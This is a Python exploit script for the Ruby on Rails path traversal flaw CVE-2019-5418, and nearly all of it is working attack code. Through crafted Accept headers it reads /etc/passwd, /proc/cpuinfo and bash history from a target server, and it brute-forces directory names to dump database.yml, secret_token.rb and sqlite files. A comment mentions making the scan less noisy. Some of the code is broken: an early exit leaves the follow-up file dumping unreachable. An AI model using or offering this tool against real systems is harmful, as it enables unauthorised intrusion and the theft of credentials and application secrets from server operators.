from __future__ import print_function
import sys
import time
import random

try:
    import requests
except ImportError:
    print('\n\033[93m[!] Requests library not found, please install before proceeding.\n\n \033[0m')
    sys.exit(1)


def banner():
    banner = """
	----------------------------------------------
	Arbitrary Traversal exploit for Ruby on Rails
	                 CVE-2019-5418
	----------------------------------------------
	"""
    print(banner)


def check_args():
    if len(sys.argv) != 2:
        print("Invalid number of arguments entered!")
        how_to_use = "python3 Bandit.py url"
        print('Use as:', how_to_use)
        sys.exit(1)


def read_file(url, file):
    headers = {'Accept': file + '{{'}
    req = requests.get(url, headers=headers)
    return req

def help(lines, once, output):
    if once:
        print('Printing Lines')
        for line in lines:
            print(line)
    print('\nPrinting Output')
    for line in output:
        print(line)


def brute_force_data(url):
    # function to brute force sensitive data
    # assuming the person did not rename ruby on rails stable directories
    print('\n\n\033[93m[!]\t     BRUTE FORCING DATA.... \n\n \033[0m')
    file_path = '../../../../../../../../../../home/rails/'
    base_req = requests.get(url)
    lines = [line.strip() for line in str(base_req.text).splitlines()]
    files = ["db/seeds.rb", "db/structure.sql", "development.sqlite3",
             "config/database.yml", "config/initializers/secret_token.rb"]
    found = False
    with open('common.txt', 'r') as fp:
        for file in fp:
            file = file_path + file.strip() + '/' + files[3]
            #print(file)
            headers = {'Accept': file + '{{'}
            req = requests.get(url, headers=headers)
            #time.sleep(random.randint(1,3))
            #Comment this out to be less noisy!
            output = [line.strip() for line in str(req.text).splitlines()]
            if len(lines) != len(output) and len(output) < len(lines) \
                and lines[0] != output[0] and 'Exception Caught' not in lines:
                print('\n\n\033[93m[!] \t     DUMPING: ', files[3] + '\n\n \033[0m')
                for line in output:
                    print(line)
                    file_path = file_path + file.strip() + '/'
                    found = True
                break
    # now since we know where to look we can read sensitive files
    sys.exit(-2)
    if found:
        print('FILE PATH IS: ', file_path)
        del files[3]
        # pop off the fourth element since already read it
        for file in files:
            file = file_path + file
            headers = {'Accept': file + '{{'}
            req = requests.get(url, headers=headers)
            output = [line.strip() for line in str(req.text).splitlines()]
            # sanity check
            if len(output) != len(lines) and lines[0] != output[0]:
                print('Dumping: ', file)
                for line in output:
                    print(line)

    else:
        "Could not brute force, file may not exist!"

def main():
    banner()
    check_args()
    url = sys.argv[1]
    while True:
        menu = """\033[93m
             Enter an option or a file path (enter quit or q to exit)\n
             enter 1 for /etc/passwd \n
             enter 2 for /proc/cpuinfo \n
             enter 3 for bash history \n
             enter 4 to brute force: \033[0m"""
        try:
            file = input(menu)
        except Exception:
            file = raw_input(menu)
        if file == 'quit' or file == 'q':
            break
        if file == '1':
            file = '../../../../../../../../../etc/passwd'
        elif file == '2':
            file = '../../../../../../../../../proc/cpuinfo'
        elif file == '3':
            file = '../../../../../../../../../home/rails/.bash_history'
            # replace rails with other user if applicable
        elif file == '4':
            brute_force_data(url)
            continue
        response = read_file(url, file)
        print(response.text)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n\033[93m[!] ctrl+c detected from user, quitting.\n\n \033[0m')
